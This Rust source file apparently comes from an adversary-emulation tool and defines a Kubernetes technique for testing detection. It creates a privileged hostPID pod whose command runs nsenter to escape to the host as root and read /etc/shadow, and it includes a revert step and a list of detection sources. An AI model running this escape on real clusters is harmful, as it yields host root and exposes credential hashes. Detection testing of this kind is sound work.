use std::collections::HashMap;
use std::sync::Arc;
use anyhow::Result;
use k8s_openapi::api::core::v1::{Container, Pod, PodSpec, SecurityContext};
use k8s_openapi::apimachinery::pkg::apis::meta::v1::ObjectMeta;
use kube::{Api, Client};
use kube::api::PostParams;

use crate::platform::Platform;
use crate::providers::CloudProviders;
use crate::tactic::MitreTactic;
use crate::technique::{AttackTechnique, BoxFuture};

const NAMESPACE: &str = "default";
const POD_NAME: &str = "stratus-red-team-privileged";

async fn detonate_impl(
    _outputs: HashMap<String, String>,
    _providers: Arc<CloudProviders>,
) -> Result<()> {
    let client = Client::try_default()
        .await
        .map_err(|e| anyhow::anyhow!("Failed to create Kubernetes client: {}. Ensure KUBECONFIG is set.", e))?;

    let pods: Api<Pod> = Api::namespaced(client.clone(), NAMESPACE);

    let pod = Pod {
        metadata: ObjectMeta {
            name: Some(POD_NAME.to_string()),
            namespace: Some(NAMESPACE.to_string()),
            ..Default::default()
        },
        spec: Some(PodSpec {
            containers: vec![Container {
                name: "attacker".to_string(),
                image: Some("ubuntu:22.04".to_string()),
                command: Some(vec![
                    "sh".to_string(),
                    "-c".to_string(),
                    // nsenter to escape into host namespace and run commands as host root
                    "nsenter --target 1 --mount --uts --ipc --net --pid -- bash -c 'id && uname -a && cat /etc/shadow 2>/dev/null | head -5' || echo 'nsenter not available, but privileged pod created successfully'; sleep 3600".to_string(),
                ]),
                security_context: Some(SecurityContext {
                    privileged: Some(true),
                    ..Default::default()
                }),
                ..Default::default()
            }],
            host_pid: Some(true),
            restart_policy: Some("Never".to_string()),
            ..Default::default()
        }),
        ..Default::default()
    };

    pods.create(&PostParams::default(), &pod)
        .await
        .map_err(|e| anyhow::anyhow!("Failed to create privileged pod: {}", e))?;

    println!(
        "Created privileged pod '{}/{}' with hostPID=true and securityContext.privileged=true — \
         container can use nsenter to escape to host namespace",
        NAMESPACE, POD_NAME
    );
    println!("Check pod logs with: kubectl logs -n {} {}", NAMESPACE, POD_NAME);

    Ok(())
}

fn detonate(
    outputs: HashMap<String, String>,
    providers: Arc<CloudProviders>,
) -> BoxFuture<Result<()>> {
    Box::pin(detonate_impl(outputs, providers))
}

async fn revert_impl(
    _outputs: HashMap<String, String>,
    _providers: Arc<CloudProviders>,
) -> Result<()> {
    let client = Client::try_default()
        .await
        .map_err(|e| anyhow::anyhow!("Failed to create Kubernetes client: {}", e))?;

    let pods: Api<Pod> = Api::namespaced(client, NAMESPACE);
    pods.delete(POD_NAME, &Default::default())
        .await
        .map_err(|e| anyhow::anyhow!("Failed to delete pod: {}", e))?;

    println!("Deleted privileged pod '{}/{}'", NAMESPACE, POD_NAME);
    Ok(())
}

fn revert(
    outputs: HashMap<String, String>,
    providers: Arc<CloudProviders>,
) -> BoxFuture<Result<()>> {
    Box::pin(revert_impl(outputs, providers))
}

inventory::submit! {
    AttackTechnique {
        id: "k8s.privilege-escalation.privileged-pod",
        friendly_name: "Create Privileged Pod for Container Escape",
        description: "Creates a privileged Kubernetes pod with hostPID=true, allowing the container to use nsenter to escape into the host's namespace and execute commands as host root.",
        detection: "Kubernetes audit log: create pods with privileged securityContext. Falco: Privileged pod created. OPA/Gatekeeper: Privileged container policy violation.",
        platform: Platform::Kubernetes,
        mitre_tactics: &[MitreTactic::PrivilegeEscalation],
        is_idempotent: false,
        is_slow: false,
        prerequisite_tf: None,
        detonate,
        revert: Some(revert),
    }
}
